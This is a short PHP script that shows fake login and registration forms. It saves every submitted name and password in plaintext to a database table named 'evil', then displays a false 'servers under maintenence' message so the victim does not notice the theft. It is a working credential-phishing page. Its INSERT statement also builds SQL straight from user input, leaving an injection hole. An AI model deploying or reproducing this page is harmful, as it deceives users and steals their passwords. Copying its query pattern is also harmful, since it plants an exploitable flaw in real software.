<?php
require 'common2.php';

if (isset($_POST['submit']) OR isset($_POST['register'])){
  $sql="
  CREATE TABLE IF NOT EXISTS evil
  (
  number int NOT NULL AUTO_INCREMENT,
  name varchar(255),
  pw varchar(255),
  PRIMARY KEY (number)
  );";
  $mysql=$db->prepare($sql);
  if($mysql->execute()){
    echo'error!';
  }

  $name=$_POST['name'];
  $pw=$_POST['pw'];
    $sql="INSERT INTO evil (name, pw) VALUES ('$name', '$pw')";
    $mysql=$db->prepare($sql);
    $mysql->execute();

  echo 'Sorry our servers are under maintenence please try again later';
}
else{
  echo'

        <h2>Login</h2>
        <form method="POST" action="dunmy.php">
        name<input name="name" type="text">
        password<input name="pw" type="password">
        <input type="submit" name="submit" value="submit">
        </form>
        <h2>Register</h2>
        <form method="POST" action="dunmy.php">
        name<input name="name" type="text">
        password<input name="pw" type="password">
        <input type="submit" name="register" value="submit">
        </form>


  ';
}
?>

